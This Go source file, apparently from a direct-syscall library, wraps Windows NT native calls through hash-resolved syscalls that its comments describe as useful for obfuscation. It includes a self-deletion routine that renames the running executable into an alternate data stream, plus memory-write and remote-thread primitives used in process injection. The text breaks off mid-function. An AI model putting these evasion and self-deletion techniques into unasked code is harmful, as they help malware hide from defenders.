// Package winapi provides direct Windows API syscalls using assembly and PE parsing
package winapi

import (
	"fmt"
	"os"
	"time"
	"unsafe"
	"runtime"
	"strings"
	
	"github.com/Binject/debug/pe"
	"github.com/carved4/go-direct-syscall/pkg/debug"
	"github.com/carved4/go-direct-syscall/pkg/obf"
	"github.com/carved4/go-direct-syscall/pkg/syscall"
	"github.com/carved4/go-direct-syscall/pkg/syscallresolve"
)

// DirectSyscall executes a direct syscall by function name
// This is the main function library users should use
func DirectSyscall(functionName string, args ...uintptr) (uintptr, error) {
	functionHash := obf.GetHash(functionName)
	return syscall.HashSyscall(functionHash, args...)
}

// DirectSyscallByHash executes a direct syscall by function name hash
// Useful for obfuscation when you want to pre-compute hashes
func DirectSyscallByHash(functionHash uint32, args ...uintptr) (uintptr, error) {
	return syscall.HashSyscall(functionHash, args...)
}

// GetCurrentProcessHandle returns the pseudo-handle for the current process
func GetCurrentProcessHandle() uintptr {
	return 0xFFFFFFFFFFFFFFFF // -1 as uintptr (current process pseudo-handle)
}

// GetCurrentThreadHandle returns the pseudo-handle for the current thread
func GetCurrentThreadHandle() uintptr {
	return 0xFFFFFFFFFFFFFFFE // -2 as uintptr (current thread pseudo-handle)
}

// GetCurrentProcessId returns the current process ID
func GetCurrentProcessId() uintptr {
	pid := os.Getpid()
	return uintptr(pid)
}

// DirectCall executes a direct call to any Windows API function by address
// This is different from DirectSyscall - it calls regular API functions, not syscalls
func DirectCall(functionAddr uintptr, args ...uintptr) (uintptr, error) {
	return syscall.DirectCall(functionAddr, args...)
}

// DirectCallWithStack executes a direct call with proper x64 calling convention handling
func DirectCallWithStack(functionAddr uintptr, args ...uintptr) (uintptr, error) {
	// Ensure we're locked to one thread
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	
	// Print args for debugging before modification
	debug.Printfln("WINAPI", "DirectCallWithStack: Original args=%v\n", args)
	
	// Allocate shadow space and ensure it stays alive
	type CallFrame struct {
		shadow [32]byte // Shadow space for first 4 parameters
		extra  []byte   // Extra space for additional parameters
	}
	frame := new(CallFrame)
	
	// Calculate extra space needed
	if len(args) > 4 {
		frame.extra = make([]byte, ((len(args)-4)*8+15)&^15)
	}
	
	// Debug print the actual call we're about to make
	debug.Printfln("WINAPI", "Making direct call to 0x%X with %d args\n", functionAddr, len(args))
	for i, arg := range args {
		debug.Printfln("WINAPI", "  Arg[%d] = 0x%X\n", i, arg)
	}
	
	// Keep frame alive during call
	runtime.KeepAlive(frame)
	
	// Make the actual call
	result, err := syscall.DirectCall(functionAddr, args...)
	
	// Keep frame alive after call
	runtime.KeepAlive(frame)
	
	debug.Printfln("WINAPI", "DirectCall result: 0x%X err=%v\n", result, err)
	return result, err
}

// GetSyscallNumber returns the syscall number for a given function name
// Useful for debugging or when you need the raw syscall number
func GetSyscallNumber(functionName string) uint16 {
	functionHash := obf.GetHash(functionName)
	return syscallresolve.GetSyscallNumber(functionHash)
}

// GetFunctionHash returns the hash for a function name
// Useful for pre-computing hashes for obfuscation
func GetFunctionHash(functionName string) uint32 {
	return obf.GetHash(functionName)
}

// GetSyscallWithValidation provides enhanced syscall resolution with validation
// Returns the syscall number, validation status, and any errors
func GetSyscallWithValidation(functionName string) (uint16, bool, error) {
	functionHash := obf.GetHash(functionName)
	return syscallresolve.GetSyscallWithValidation(functionHash)
}

// PrewarmSyscallCache preloads common syscall numbers for better performance
// This should be called early in your application to improve syscall resolution speed
func PrewarmSyscallCache() error {
	return syscallresolve.PrewarmSyscallCache()
}

// GetSyscallCacheSize returns the number of cached syscall numbers
func GetSyscallCacheSize() int {
	return syscallresolve.GetSyscallCacheSize()
}

// GetSyscallCacheStats returns detailed cache statistics
func GetSyscallCacheStats() map[string]interface{} {
	return map[string]interface{}{
		"cache_size": syscallresolve.GetSyscallCacheSize(),
		"cache_enabled": true,
		"hash_algorithm": "DBJ2",
	}
}

func SelfDel() {
	exePath, err := os.Executable()
	if err != nil {
		panic(err)
	}
	
	// Use NT path format which is required for NtCreateFile with DELETE access
	ntPath := "\\??\\" + exePath
	debug.Printfln("SELFDEL", "Using NT path format: %s\n", ntPath)
	
	if tryDeleteWithPath(ntPath) {
		debug.Printfln("SELFDEL", "Successfully initiated self-deletion\n")
		return
	}
	
	debug.Printfln("SELFDEL", "[!] Self-deletion failed\n")
}

func tryDeleteWithPath(pathToTry string) bool {
	// Convert to UTF-16 for NtCreateFile
	utfPath := StringToUTF16(pathToTry)

	// Create UNICODE_STRING manually and correctly
	// Count the actual UTF-16 length (excluding null terminator)
	pathLen := uint16(0)
	ptr := utfPath
	for *ptr != 0 {
		pathLen += 2 // Each UTF-16 character is 2 bytes
		ptr = (*uint16)(unsafe.Pointer(uintptr(unsafe.Pointer(ptr)) + 2))
	}

	objectName := UNICODE_STRING{
		Length:        pathLen,           // Length in bytes (excluding null terminator)
		MaximumLength: pathLen + 2,       // Include null terminator
		Buffer:        utfPath,
	}

	debug.Printfln("SELFDEL", "UNICODE_STRING: Length=%d, MaxLength=%d\n", objectName.Length, objectName.MaximumLength)

	// Initialize OBJECT_ATTRIBUTES
	objAttr := OBJECT_ATTRIBUTES{
		Length:                   uint32(unsafe.Sizeof(OBJECT_ATTRIBUTES{})),
		RootDirectory:            0,
		ObjectName:               &objectName,
		Attributes:               OBJ_CASE_INSENSITIVE,
		SecurityDescriptor:       0,
		SecurityQualityOfService: 0,
	}

	debug.Printfln("SELFDEL", "OBJECT_ATTRIBUTES initialized, Length=%d\n", objAttr.Length)

	// Open the file handle via NtCreateFile
	var handle uintptr
	var ioStatus IO_STATUS_BLOCK

	status, err := NtCreateFile(
		&handle,
		DELETE|SYNCHRONIZE,
		uintptr(unsafe.Pointer(&objAttr)),
		uintptr(unsafe.Pointer(&ioStatus)),
		nil, // AllocationSize
		FILE_ATTRIBUTE_NORMAL,
		FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
		FILE_OPEN,
		FILE_NON_DIRECTORY_FILE|FILE_SYNCHRONOUS_IO_NONALERT,
		nil, // EaBuffer
		0,   // EaLength
	)
	if err != nil || status != STATUS_SUCCESS {
		debug.Printfln("SELFDEL", "NtCreateFile failed: %v (%s)\n", err, FormatNTStatus(status))
		return false
	}
	defer NtClose(handle)
	debug.Printfln("SELFDEL", "File handle acquired with DELETE access\n")

	// Prepare FILE_RENAME_INFORMATION with alternate data stream name
	streamName := ":trash"
	streamUTF16 := StringToUTF16(streamName)
	
	// Calculate the actual UTF-16 byte length (excluding null terminator)
	streamNameBytes := 0
	ptr = streamUTF16
	for *ptr != 0 {
		streamNameBytes += 2
		ptr = (*uint16)(unsafe.Pointer(uintptr(unsafe.Pointer(ptr)) + 2))
	}
	
	// Create the rename information structure
	renameSize := uintptr(unsafe.Sizeof(FILE_RENAME_INFO{})) + uintptr(streamNameBytes)
	buf := make([]byte, renameSize)
	renameInfo := (*FILE_RENAME_INFO)(unsafe.Pointer(&buf[0]))
	renameInfo.ReplaceIfExists = 1  // Allow replacement
	renameInfo.RootDirectory = 0    // No root directory
	renameInfo.FileNameLength = uint32(streamNameBytes)
	
	// Copy the UTF-16 string to the FileName field (without null terminator)
	dstPtr := uintptr(unsafe.Pointer(&renameInfo.FileName[0]))
	srcPtr := uintptr(unsafe.Pointer(streamUTF16))
	for i := 0; i < streamNameBytes/2; i++ {
		*(*uint16)(unsafe.Pointer(dstPtr + uintptr(i*2))) = *(*uint16)(unsafe.Pointer(srcPtr + uintptr(i*2)))
	}

	// Call NtSetInformationFile to rename to ADS
	status, err = NtSetInformationFile(
		handle,
		uintptr(unsafe.Pointer(&ioStatus)),
		unsafe.Pointer(renameInfo),
		uintptr(renameSize),
		FileRenameInformation,
	)
	if err != nil || status != STATUS_SUCCESS {
		debug.Printfln("SELFDEL", "Rename failed: %v (%s)\n", err, FormatNTStatus(status))
		return false
	}
	debug.Printfln("SELFDEL", "File renamed to ADS\n")

	// Set FILE_DISPOSITION_INFO to mark for deletion
	dispose := FILE_DISPOSITION_INFO{DeleteFile: 1}
	status, err = NtSetInformationFile(
		handle,
		uintptr(unsafe.Pointer(&ioStatus)),
		unsafe.Pointer(&dispose),
		uintptr(unsafe.Sizeof(dispose)),
		FileDispositionInformation,
	)
	if err != nil || status != STATUS_SUCCESS {
		debug.Printfln("SELFDEL", "Disposition failed: %v (%s)\n", err, FormatNTStatus(status))
		return false
	}
	debug.Printfln("SELFDEL", "File marked for deletion\n")
	return true
}

// StringToUTF16 converts a Go string to a UTF16 string pointer
// This replaces syscall.UTF16PtrFromString to avoid standard library dependencies
func StringToUTF16(s string) *uint16 {
	if s == "" {
		// Return pointer to null terminator for empty strings
		nullTerm := uint16(0)
		return &nullTerm
	}
	
	// Convert string to runes first (handles Unicode properly)
	runes := []rune(s)
	
	// Allocate buffer for UTF16 + null terminator
	utf16Slice := make([]uint16, 0, len(runes)+1)
	
	// Convert each rune to UTF16
	for _, r := range runes {
		if r < 0x10000 {
			// Basic Multilingual Plane - single UTF16 unit
			utf16Slice = append(utf16Slice, uint16(r))
		} else {
			// Supplementary plane - needs surrogate pair
			r -= 0x10000
			high := uint16((r>>10)&0x3FF) + 0xD800  // High surrogate
			low := uint16(r&0x3FF) + 0xDC00         // Low surrogate
			utf16Slice = append(utf16Slice, high, low)
		}
	}
	
	// Add null terminator
	utf16Slice = append(utf16Slice, 0)
	
	// Return pointer to first element
	return &utf16Slice[0]
}

// Common Windows API functions with proper type safety

// NtAllocateVirtualMemory allocates memory in a process
func NtAllocateVirtualMemory(processHandle uintptr, baseAddress *uintptr, zeroBits uintptr, regionSize *uintptr, allocationType, protect uintptr) (uintptr, error) {
	return DirectSyscall("NtAllocateVirtualMemory",
		processHandle,
		uintptr(unsafe.Pointer(baseAddress)),
		zeroBits,
		uintptr(unsafe.Pointer(regionSize)),
		allocationType,
		protect)
}

// NtWriteVirtualMemory writes to memory in a process
func NtWriteVirtualMemory(processHandle uintptr, baseAddress uintptr, buffer unsafe.Pointer, size uintptr, bytesWritten *uintptr) (uintptr, error) {
	debug.Printfln("WINAPI", "NtWriteVirtualMemory called\n")
	
	// Make the syscall (simple and direct like other functions)
	result, err := DirectSyscall("NtWriteVirtualMemory",
		processHandle,
		baseAddress,
		uintptr(buffer),
		size,
		uintptr(unsafe.Pointer(bytesWritten)))
	
	// Only log bytes written if pointer is valid
	if bytesWritten != nil {
		debug.Printfln("WINAPI", "Result status: 0x%X, Bytes written: %d\n", result, *bytesWritten)
	} else {
		debug.Printfln("WINAPI", "Result status: 0x%X\n", result)
	}
	
	return result, err
}

// NtReadVirtualMemory reads from memory in a process
func NtReadVirtualMemory(processHandle uintptr, baseAddress uintptr, buffer unsafe.Pointer, size uintptr, bytesRead *uintptr) (uintptr, error) {
	return DirectSyscall("NtReadVirtualMemory",
		processHandle,
		baseAddress,
		uintptr(buffer),
		size,
		uintptr(unsafe.Pointer(bytesRead)))
}

// NtProtectVirtualMemory changes memory protection
func NtProtectVirtualMemory(processHandle uintptr, baseAddress *uintptr, regionSize *uintptr, newProtect uintptr, oldProtect *uintptr) (uintptr, error) {
	return DirectSyscall("NtProtectVirtualMemory",
		processHandle,
		uintptr(unsafe.Pointer(baseAddress)),
		uintptr(unsafe.Pointer(regionSize)),
		newProtect,
		uintptr(unsafe.Pointer(oldProtect)))
}

// NtCreateThreadEx creates a thread in a process
func NtCreateThreadEx(threadHandle *uintptr, desiredAccess uintptr, objectAttributes uintptr, processHandle uintptr, startAddress uintptr, arg uintptr, createFlags uintptr, zeroBits uintptr, stackSize uintptr, maximumStackSize uintptr, attributeList uintptr) (uintptr, error) {
	return DirectSyscall("NtCreateThreadEx",
		uintptr(unsafe.Pointer(threadHandle)),
		desiredAccess,
		objectAttributes,
		processHandle,
		startAddress,
		arg,
		createFlags,
		zeroBits,
		stackSize,
		maximumStackSize,
		attributeList)
}

// NtOpenProcess opens a handle to a process
func NtOpenProcess(processHandle *uintptr, desiredAccess uintptr, objectAttributes uintptr, clientId uintptr) (uintptr, error) {
	return DirectSyscall("NtOpenProcess",
		uintptr(unsafe.Pointer(processHandle)),
		desiredAccess,
		objectAttributes,
		clientId)
}

// NtClose closes a handle
func NtClose(handle uintptr) (uintptr, error) {
	return DirectSyscall("NtClose", handle)
}

// NtQuerySystemInformation queries system information
func NtQuerySystemInformation(systemInformationClass uintptr, systemInformation unsafe.Pointer, systemInformationLength uintptr, returnLength *uintptr) (uintptr, error) {
	return DirectSyscall("NtQuerySystemInformation",
		systemInformationClass,
		uintptr(systemInformation),
		systemInformationLength,
		uintptr(unsafe.Pointer(returnLength)))
}

// NtQueryInformationProcess queries process information
func NtQueryInformationProcess(processHandle uintptr, processInformationClass uintptr, processInformation unsafe.Pointer, processInformationLength uintptr, returnLength *uintptr) (uintptr, error) {
	return DirectSyscall("NtQueryInformationProcess",
		processHandle,
		processInformationClass,
		uintptr(processInformation),
		processInformationLength,
		uintptr(unsafe.Pointer(returnLength)))
}

// NtSetInformationProcess sets process information
func NtSetInformationProcess(processHandle uintptr, processInformationClass uintptr, processInformation unsafe.Pointer, processInformationLength uintptr) (uintptr, error) {
	return DirectSyscall("NtSetInformationProcess",
		processHandle,
		processInformationClass,
		uintptr(processInformation),
		processInformationLength)
}

// NtCreateFile creates or opens a file
func NtCreateFile(fileHandle *uintptr, desiredAccess uintptr, objectAttributes uintptr, ioStatusBlock uintptr, allocationSize *uint64, fileAttributes uintptr, shareAccess uintptr, createDisposition uintptr, createOptions uintptr, eaBuffer unsafe.Pointer, eaLength uintptr) (uintptr, error) {
	return DirectSyscall("NtCreateFile",
		uintptr(unsafe.Pointer(fileHandle)),
		desiredAccess,
		objectAttributes,
		ioStatusBlock,
		uintptr(unsafe.Pointer(allocationSize)),
		fileAttributes,
		shareAccess,
		createDisposition,
		createOptions,
		uintptr(eaBuffer),
		eaLength)
}

// NtWriteFile writes to a file
func NtWriteFile(fileHandle uintptr, event uintptr, apcRoutine uintptr, apcContext uintptr, ioStatusBlock uintptr, buffer unsafe.Pointer, length uintptr, byteOffset *uint64, key *uintptr) (uintptr, error) {
	return DirectSyscall("NtWriteFile",
		fileHandle,
		event,
		apcRoutine,
		apcContext,
		ioStatusBlock,
		uintptr(buffer),
		length,
		uintptr(unsafe.Pointer(byteOffset)),
		uintptr(unsafe.Pointer(key)))
}

// NtReadFile reads from a file
func NtReadFile(fileHandle uintptr, event uintptr, apcRoutine uintptr, apcContext uintptr, ioStatusBlock uintptr, buffer unsafe.Pointer, length uintptr, byteOffset *uint64, key *uintptr) (uintptr, error) {
	return DirectSyscall("NtReadFile",
		fileHandle,
		event,
		apcRoutine,
		apcContext,
		ioStatusBlock,
		uintptr(buffer),
		length,
		uintptr(unsafe.Pointer(byteOffset)),
		uintptr(unsafe.Pointer(key)))
}

// Additional Process Manipulation Functions

// NtTerminateProcess terminates a process
func NtTerminateProcess(processHandle uintptr, exitStatus uintptr) (uintptr, error) {
	return DirectSyscall("NtTerminateProcess",
		processHandle,
		exitStatus)
}

// NtSuspendProcess suspends all threads in a process
func NtSuspendProcess(processHandle uintptr) (uintptr, error) {
	return DirectSyscall("NtSuspendProcess", processHandle)
}

// NtResumeProcess resumes all threads in a process
func NtResumeProcess(processHandle uintptr) (uintptr, error) {
	return DirectSyscall("NtResumeProcess", processHandle)
}

// NtCreateProcess creates a new process
func NtCreateProcess(processHandle *uintptr, desiredAccess uintptr, objectAttributes uintptr, parentProcess uintptr, inheritObjectTable bool, sectionHandle uintptr, debugPort uintptr, exceptionPort uintptr) (uintptr, error) {
	inherit := uintptr(0)
	if inheritObjectTable {
		inherit = 1
	}
	return DirectSyscall("NtCreateProcess",
		uintptr(unsafe.Pointer(processHandle)),
		desiredAccess,
		objectAttributes,
		parentProcess,
		inherit,
		sectionHandle,
		debugPort,
		exceptionPort)
}

// Thread Management Functions

// NtCreateThread creates a thread in a process
func NtCreateThread(threadHandle *uintptr, desiredAccess uintptr, objectAttributes uintptr, processHandle uintptr, startAddress uintptr, arg uintptr, createSuspended bool, zeroBits uintptr, stackSize uintptr, maximumStackSize uintptr, initialTeb uintptr) (uintptr, error) {
	flags := uintptr(0)
	if createSuspended {
		flags = 1
	}
	return DirectSyscall("NtCreateThread",
		uintptr(unsafe.Pointer(threadHandle)),
		desiredAccess,
		objectAttributes,
		processHandle,
		startAddress,
		arg,
		flags,
		zeroBits,
		stackSize,
		maximumStackSize,
		initialTeb)
}

// NtOpenThread opens a handle to a thread
func NtOpenThread(threadHandle *uintptr, desiredAccess uintptr, objectAttributes uintptr, clientId uintptr) (uintptr, error) {
	return DirectSyscall("NtOpenThread",
		uintptr(unsafe.Pointer(threadHandle)),
		desiredAccess,
		objectAttributes,
		clientId)
}

// NtSuspendThread suspends a thread
func NtSuspendThread(threadHandle uintptr, previousSuspendCount *uintptr) (uintptr, error) {
	return DirectSyscall("NtSuspendThread",
		threadHandle,
		uintptr(unsafe.Pointer(previousSuspendCount)))
}

// NtResumeThread resumes a thread
func NtResumeThread(threadHandle uintptr, previousSuspendCount *uintptr) (uintptr, error) {
	return DirectSyscall("NtResumeThread",
		threadHandle,
		uintptr(unsafe.Pointer(previousSuspendCount)))
}

// NtTerminateThread terminates a thread
func NtTerminateThread(threadHandle uintptr, exitStatus uintptr) (uintptr, error) {
	return DirectSyscall("NtTerminateThread",
		threadHandle,
		exitStatus)
}

// Memory and Section Functions

// NtCreateSection creates a section object
func NtCreateSection(sectionHandle *uintptr, desiredAccess uintptr, objectAttributes uintptr, maximumSize *uint64, sectionPageProtection uintptr, allocationAttributes uintptr, fileHandle uintptr) (uintptr, error) {
	return DirectSyscall("NtCreateSection",
		uintptr(unsafe.Pointer(sectionHandle)),
		desiredAccess,
		objectAttributes,
		uintptr(unsafe.Pointer(maximumSize)),
		sectionPageProtection,
		allocationAttributes,
		fileHandle)
}

// NtMapViewOfSection maps a view of a section
func NtMapViewOfSection(sectionHandle uintptr, processHandle uintptr, baseAddress *uintptr, zeroBits uintptr, commitSize uintptr, sectionOffset *uint64, viewSize *uintptr, inheritDisposition uintptr, allocationType uintptr, win32Protect uintptr) (uintptr, error) {
	return DirectSyscall("NtMapViewOfSection",
		sectionHandle,
		processHandle,
		uintptr(unsafe.Pointer(baseAddress)),
		zeroBits,
		commitSize,
		uintptr(unsafe.Pointer(sectionOffset)),
		uintptr(unsafe.Pointer(viewSize)),
		inheritDisposition,
		allocationType,
		win32Protect)
}

// NtUnmapViewOfSection unmaps a view of a section
func NtUnmapViewOfSection(processHandle uintptr, baseAddress uintptr) (uintptr, error) {
	return DirectSyscall("NtUnmapViewOfSection",
		processHandle,
		baseAddress)
}

// NtFreeVirtualMemory frees virtual memory
func NtFreeVirtualMemory(processHandle uintptr, baseAddress *uintptr, regionSize *uintptr, freeType uintptr) (uintptr, error) {
	return DirectSyscall("NtFreeVirtualMemory",
		processHandle,
		uintptr(unsafe.Pointer(baseAddress)),
		uintptr(unsafe.Pointer(regionSize)),
		freeType)
}

// NtQueryVirtualMemory queries virtual memory information
func NtQueryVirtualMemory(processHandle uintptr, baseAddress uintptr, memoryInformationClass uintptr, memoryInformation unsafe.Pointer, memoryInformationLength uintptr, returnLength *uintptr) (uintptr, error) {
	return DirectSyscall("NtQueryVirtualMemory",
		processHandle,
		baseAddress,
		memoryInformationClass,
		uintptr(memoryInformation),
		memoryInformationLength,
		uintptr(unsafe.Pointer(returnLength)))
}

// Registry Functions

// NtCreateKey creates or opens a registry key
func NtCreateKey(keyHandle *uintptr, desiredAccess uintptr, objectAttributes uintptr, titleIndex uintptr, class uintptr, createOptions uintptr, disposition *uintptr) (uintptr, error) {
	return DirectSyscall("NtCreateKey",
		uintptr(unsafe.Pointer(keyHandle)),
		desiredAccess,
		objectAttributes,
		titleIndex,
		class,
		createOptions,
		uintptr(unsafe.Pointer(disposition)))
}

// NtOpenKey opens a registry key
func NtOpenKey(keyHandle *uintptr, desiredAccess uintptr, objectAttributes uintptr) (uintptr, error) {
	return DirectSyscall("NtOpenKey",
		uintptr(unsafe.Pointer(keyHandle)),
		desiredAccess,
		objectAttributes)
}

// NtDeleteKey deletes a registry key
func NtDeleteKey(keyHandle uintptr) (uintptr, error) {
	return DirectSyscall("NtDeleteKey", keyHandle)
}

// NtSetValueKey sets a registry value
func NtSetValueKey(keyHandle uintptr, valueName uintptr, titleIndex uintptr, dataType uintptr, data unsafe.Pointer, dataSize uintptr) (uintptr, error) {
	return DirectSyscall("NtSetValueKey",
		keyHandle,
		valueName,
		titleIndex,
		dataType,
		uintptr(data),
		dataSize)
}

// NtQueryValueKey queries a registry value
func NtQueryValueKey(keyHandle uintptr, valueName uintptr, keyValueInformationClass uintptr, keyValueInformation unsafe.Pointer, length uintptr, resultLength *uintptr) (uintptr, error) {
	return DirectSyscall("NtQueryValueKey",
		keyHandle,
		valueName,
		keyValueInformationClass,
		uintptr(keyValueInformation),
		length,
		uintptr(unsafe.Pointer(resultLength)))
}

// NtDeleteValueKey deletes a registry value
func NtDeleteValueKey(keyHandle uintptr, valueName uintptr) (uintptr, error) {
	return DirectSyscall("NtDeleteValueKey",
		keyHandle,
		valueName)
}

// Security and Token Functions

// NtOpenProcessToken opens a process token
func NtOpenProcessToken(processHandle uintptr, desiredAccess uintptr, tokenHandle *uintptr) (uintptr, error) {
	return DirectSyscall("NtOpenProcessToken",
		processHandle,
		desiredAccess,
		uintptr(unsafe.Pointer(tokenHandle)))
}

// NtOpenThreadToken opens a thread token
func NtOpenThreadToken(threadHandle uintptr, desiredAccess uintptr, openAsSelf bool, tokenHandle *uintptr) (uintptr, error) {
	openSelf := uintptr(0)
	if openAsSelf {
		openSelf = 1
	}
	return DirectSyscall("NtOpenThreadToken",
		threadHandle,
		desiredAccess,
		openSelf,
		uintptr(unsafe.Pointer(tokenHandle)))
}

// NtQueryInformationToken queries token information
func NtQueryInformationToken(tokenHandle uintptr, tokenInformationClass uintptr, tokenInformation unsafe.Pointer, tokenInformationLength uintptr, returnLength *uintptr) (uintptr, error) {
	return DirectSyscall("NtQueryInformationToken",
		tokenHandle,
		tokenInformationClass,
		uintptr(tokenInformation),
		tokenInformationLength,
		uintptr(unsafe.Pointer(returnLength)))
}

// NtSetInformationToken sets token information
func NtSetInformationToken(tokenHandle uintptr, tokenInformationClass uintptr, tokenInformation unsafe.Pointer, tokenInformationLength uintptr) (uintptr, error) {
	return DirectSyscall("NtSetInformationToken",
		tokenHandle,
		tokenInformationClass,
		uintptr(tokenInformation),
		tokenInformationLength)
}

// NtAdjustPrivilegesToken adjusts token privileges
func NtAdjustPrivilegesToken(tokenHandle uintptr, disableAllPrivileges bool, newState unsafe.Pointer, bufferLength uintptr, previousState unsafe.Pointer, returnLength *uintptr) (uintptr, error) {
	disable := uintptr(0)
	if disableAllPrivileges {
		disable = 1
	}
	return DirectSyscall("NtAdjustPrivilegesToken",
		tokenHandle,
		disable,
		uintptr(newState),
		bufferLength,
		uintptr(previousState),
		uintptr(unsafe.Pointer(returnLength)))
}

// Object and Handle Functions

// NtDuplicateObject duplicates an object handle
func NtDuplicateObject(sourceProcessHandle uintptr, sourceHandle uintptr, targetProcessHandle uintptr, targetHandle *uintptr, desiredAccess uintptr, inheritHandle bool, options uintptr) (uintptr, error) {
	inherit := uintptr(0)
	if inheritHandle {
		inherit = 1
	}
	return DirectSyscall("NtDuplicateObject",
		sourceProcessHandle,
		sourceHandle,
		targetProcessHandle,
		uintptr(unsafe.Pointer(targetHandle)),
		desiredAccess,
		inherit,
		options)
}

// NtQueryObject queries information about an object
func NtQueryObject(handle uintptr, objectInformationClass uintptr, objectInformation unsafe.Pointer, objectInformationLength uintptr, returnLength *uintptr) (uintptr, error) {
	return DirectSyscall("NtQueryObject",
		handle,
		objectInformationClass,
		uintptr(objectInformation),
		objectInformationLength,
		uintptr(unsafe.Pointer(returnLength)))
}

// System Information and Control Functions

// NtSetSystemInformation sets system information
func NtSetSystemInformation(systemInformationClass uintptr, systemInformation unsafe.Pointer, systemInformationLength uintptr) (uintptr, error) {
	return DirectSyscall("NtSetSystemInformation",
		systemInformationClass,
		uintptr(systemInformation),
		systemInformationLength)
}

// NtQuerySystemTime queries system time
func NtQuerySystemTime(systemTime *uint64) (uintptr, error) {
	return DirectSyscall("NtQuerySystemTime",
		uintptr(unsafe.Pointer(systemTime)))
}

// NtSetSystemTime sets system time
func NtSetSystemTime(systemTime *uint64, previousTime *uint64) (uintptr, error) {
	return DirectSyscall("NtSetSystemTime",
		uintptr(unsafe.Pointer(systemTime)),
		uintptr(unsafe.Pointer(previousTime)))
}

// Event and Synchronization Functions

// NtCreateEvent creates an event object
func NtCreateEvent(eventHandle *uintptr, desiredAccess uintptr, objectAttributes uintptr, eventType uintptr, initialState bool) (uintptr, error) {
	state := uintptr(0)
	if initialState {
		state = 1
	}
	return DirectSyscall("NtCreateEvent",
		uintptr(unsafe.Pointer(eventHandle)),
		desiredAccess,
		objectAttributes,
		eventType,
		state)
}

// NtOpenEvent opens an event object
func NtOpenEvent(eventHandle *uintptr, desiredAccess uintptr, objectAttributes uintptr) (uintptr, error) {
	return DirectSyscall("NtOpenEvent",
		uintptr(unsafe.Pointer(eventHandle)),
		desiredAccess,
		objectAttributes)
}

// NtSetEvent sets an event to signaled state
func NtSetEvent(eventHandle uintptr, previousState *uintptr) (uintptr, error) {
	return DirectSyscall("NtSetEvent",
		eventHandle,
		uintptr(unsafe.Pointer(previousState)))
}

// NtResetEvent resets an event to non-signaled state
func NtResetEvent(eventHandle uintptr, previousState *uintptr) (uintptr, error) {
	return DirectSyscall("NtResetEvent",
		eventHandle,
		uintptr(unsafe.Pointer(previousState)))
}

// NtWaitForSingleObject waits for a single object
func NtWaitForSingleObject(handle uintptr, alertable bool, timeout *uint64) (uintptr, error) {
	alert := uintptr(0)
	if alertable {
		alert = 1
	}
	return DirectSyscall("NtWaitForSingleObject",
		handle,
		alert,
		uintptr(unsafe.Pointer(timeout)))
}

// NtWaitForMultipleObjects waits for multiple objects
func NtWaitForMultipleObjects(count uintptr, handles *uintptr, waitType uintptr, alertable bool, timeout *uint64) (uintptr, error) {
	alert := uintptr(0)
	if alertable {
		alert = 1
	}
	return DirectSyscall("NtWaitForMultipleObjects",
		count,
		uintptr(unsafe.Pointer(handles)),
		waitType,
		alert,
		uintptr(unsafe.Pointer(timeout)))
}

// File System Functions

// NtDeleteFile deletes a file
func NtDeleteFile(objectAttributes uintptr) (uintptr, error) {
	return DirectSyscall("NtDeleteFile", objectAttributes)
}

// NtQueryDirectoryFile queries directory contents
func NtQueryDirectoryFile(fileHandle uintptr, event uintptr, apcRoutine uintptr, apcContext uintptr, ioStatusBlock uintptr, fileInformation unsafe.Pointer, length uintptr, fileInformationClass uintptr, returnSingleEntry bool, fileName uintptr, restartScan bool) (uintptr, error) {
	single := uintptr(0)
	if returnSingleEntry {
		single = 1
	}
	restart := uintptr(0)
	if restartScan {
		restart = 1
	}
	return DirectSyscall("NtQueryDirectoryFile",
		fileHandle,
		event,
		apcRoutine,
		apcContext,
		ioStatusBlock,
		uintptr(fileInformation),
		length,
		fileInformationClass,
		single,
		fileName,
		restart)
}

// NtQueryInformationFile queries file information
func NtQueryInformationFile(fileHandle uintptr, ioStatusBlock uintptr, fileInformation unsafe.Pointer, length uintptr, fileInformationClass uintptr) (uintptr, error) {
	return DirectSyscall("NtQueryInformationFile",
		fileHandle,
		ioStatusBlock,
		uintptr(fileInformation),
		length,
		fileInformationClass)
}

// NtSetInformationFile sets file information
func NtSetInformationFile(fileHandle uintptr, ioStatusBlock uintptr, fileInformation unsafe.Pointer, length uintptr, fileInformationClass uintptr) (uintptr, error) {
	return DirectSyscall("NtSetInformationFile",
		fileHandle,
		ioStatusBlock,
		uintptr(fileInformation),
		length,
		fileInformationClass)
}

// NtDeviceIoControlFile performs an I/O control operation on a file
func NtDeviceIoControlFile(fileHandle uintptr, event uintptr, apcRoutine uintptr, apcContext uintptr, ioStatusBlock uintptr, ioControlCode uintptr, inputBuffer unsafe.Pointer, inputBufferLength uintptr, outputBuffer unsafe.Pointer, outputBufferLength uintptr) (uintptr, error) {
	return DirectSyscall("NtDeviceIoControlFile",
		fileHandle,
		event,
		apcRoutine,
		apcContext,
		ioStatusBlock,
		ioControlCode,
		uintptr(inputBuffer),
		inputBufferLength,
		uintptr(outputBuffer),
		outputBufferLength)
}

// NtRemoveIoCompletion removes a completed I/O operation from an I/O completion port
func NtRemoveIoCompletion(portHandle uintptr, keyPtr *uintptr, apcContextPtr *uintptr, ioStatusBlock uintptr, timeout *uint64) (uintptr, error) {
	return DirectSyscall("NtRemoveIoCompletion",
		portHandle,
		uintptr(unsafe.Pointer(keyPtr)),
		uintptr(unsafe.Pointer(apcContextPtr)),
		ioStatusBlock,
		uintptr(unsafe.Pointer(timeout)))
}

// NtReleaseSemaphore releases a semaphore object
func NtReleaseSemaphore(semaphoreHandle uintptr, releaseCount uintptr, previousCount *uintptr) (uintptr, error) {
	return DirectSyscall("NtReleaseSemaphore",
		semaphoreHandle,
		releaseCount,
		uintptr(unsafe.Pointer(previousCount)))
}

// NtReplyWaitReceivePort waits for and receives a message on a port, optionally sending a reply
func NtReplyWaitReceivePort(portHandle uintptr, portContext *uintptr, replyMessage uintptr, receiveMessage uintptr) (uintptr, error) {
	return DirectSyscall("NtReplyWaitReceivePort",
		portHandle,
		uintptr(unsafe.Pointer(portContext)),
		replyMessage,
		receiveMessage)
}

// NtReplyPort sends a reply message to a port
func NtReplyPort(portHandle uintptr, replyMessage uintptr) (uintptr, error) {
	return DirectSyscall("NtReplyPort",
		portHandle,
		replyMessage)
}

// NtSetInformationThread sets information about a thread
func NtSetInformationThread(threadHandle uintptr, threadInformationClass uintptr, threadInformation unsafe.Pointer, threadInformationLength uintptr) (uintptr, error) {
